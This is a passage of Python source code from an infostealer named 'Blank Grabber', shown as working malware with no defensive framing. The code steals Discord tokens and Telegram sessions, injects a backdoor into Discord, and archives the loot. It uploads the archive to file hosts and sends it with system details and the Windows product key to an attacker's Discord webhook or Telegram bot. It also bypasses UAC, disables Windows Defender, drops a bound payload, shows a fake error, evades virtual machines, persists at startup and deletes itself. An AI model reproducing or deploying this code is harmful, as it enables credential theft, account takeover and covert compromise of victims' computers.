                    os.makedirs(_saveToDir, exist_ok=True)
                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1) / 2)
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, 'Info.txt'), 'w') as file:
                    file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles')

    @Errors.Catch
    def StealDiscordTokens(self) -> None:
        if Settings.CaptureDiscordTokens:
            Logger.info('Stealing discord tokens')
            output = list()
            saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Discord')
            accounts = Discord.GetTokens()
            if accounts:
                for item in accounts:
                    USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = item.values()
                    output.append('Username: {}\nUser ID: {}\nMFA enabled: {}\nEmail: {}\nPhone: {}\nVerified: {}\nNitro: {}\nBilling Method(s): {}\n\nToken: {}\n\n{}'.format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip())
                os.makedirs(os.path.join(self.TempFolder, 'Messenger', 'Discord'), exist_ok=True)
                with open(os.path.join(saveToDir, 'Discord Tokens.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                self.DiscordTokensCount += len(accounts)
        if Settings.DiscordInjection and (not Utility.IsInStartup()):
            paths = Discord.InjectJs()
            if paths is not None:
                Logger.info('Injecting backdoor into discord')
                for dir in paths:
                    appname = os.path.basename(dir)
                    Utility.TaskKill(appname)
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.lower() == appname.lower() + '.exe':
                                time.sleep(3)
                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
                                UpdateEXE = os.path.join(dir, 'Update.exe')
                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateArchive(self) -> tuple[str, str]:
        Logger.info('Creating archive')
        rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'blank123'
                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                if process.returncode == 0:
                    return 'rar'
        shutil.make_archive(self.ArchivePath.rsplit('.', 1)[0], 'zip', self.TempFolder)
        return 'zip'

    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info('Uploading %s to gofile' % (filename or 'file'))
            with open(path, 'rb') as file:
                fileBytes = file.read()
            if filename is None:
                filename = os.path.basename(path)
            http = PoolManager(cert_reqs='CERT_NONE')
            try:
                server = json.loads(http.request('GET', 'https://api.gofile.io/getServer').data.decode(errors='ignore'))['data']['server']
                if server:
                    url = json.loads(http.request('POST', 'https://{}.gofile.io/uploadFile'.format(server), fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
                    url = json.loads(http.request('POST', 'https://api.anonfiles.com/upload', fields={'file': (filename, fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
                    return url
                except Exception:
                    Logger.error('Failed to upload to anonfiles')
                    return None

    def SendData(self) -> None:
        Logger.info('Sending data to C2')
        extention = self.CreateArchive()
        if not os.path.isfile(self.ArchivePath):
            raise FileNotFoundError('Failed to create archive')
        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
        computerName = os.getenv('computername') or 'Unable to get computer name'
        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
            if r.get('status') != 'success':
                raise Exception('Failed')
            data = f'\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}'
            if len(r['reverse']) != 0:
                data += f'\nReverse DNS: {r['reverse']}'
        except Exception:
            ipinfo = '(Unable to get IP info)'
        else:
            ipinfo = data
        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['content'] += ' | Archive : %s' % url
                else:
                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
                fields['payload_json'] = json.dumps(payload).encode()
                http.request('POST', Settings.C2[1], fields=fields)
            case 1:
                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:
                    url = None
                fields = dict()
                if url:
                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
                    method = 'sendMessage'
                else:
                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
                    method = 'sendDocument'
                token, chat_id = Settings.C2[1].split('$')
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
if os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
                Logger.info('Trying to bypass UAC (Application will restart)')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('Failed to bypass UAC')
                    if not Utility.IsInStartup(sys.executable):
                        logger.info('Showing UAC prompt')
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                Logger.info('Showing UAC prompt to user (Application will restart)')
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)
    Logger.info('Trying to create mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex already exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Trying to exclude the file from Windows defender')
        Utility.ExcludeFromDefender()
    Logger.info('Trying to disable defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
        try:
            Logger.info('Trying to extract bound file')
            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
                Logger.info('Old bound file found, removing it')
                os.remove(boundFileDst)
            with open(boundFileSrc, 'rb') as file:
                content = file.read()
            decrypted = zlib.decompress(content[::-1])
            with open(boundFileDst, 'wb') as file:
                file.write(decrypted)
            del content, decrypted
            Logger.info('Trying to exclude bound file from defender')
            Utility.ExcludeFromDefender(boundFileDst)
            Logger.info('Starting bound file')
            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            Logger.info('Showing fake error popup')
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Logger.info('Hiding the file')
                Utility.HideSelf()
        elif Settings.Melt:
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                Logger.info('Trying to put the file in startup')
                path = Utility.PutInStartup()
                if path is not None:
                    Logger.info('Excluding the file from Windows defender in startup')
                    Utility.ExcludeFromDefender(path)
        except Exception:
            Logger.error('Failed to put the file in startup')
        while True:
            try:
                Logger.info('Checking internet connection')
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
                    BlankGrabber()
                    Logger.info('Stealer finished its work')
                    break
                else:
                    Logger.info('Internet connection not found, retrying in 10 seconds')
                    time.sleep(10)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                Logger.critical(e, exc_info=True)
                Logger.info('There was an error, retrying after 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Logger.info('Deleting the file')
            Utility.DeleteSelf()
        Logger.info('Process ended')
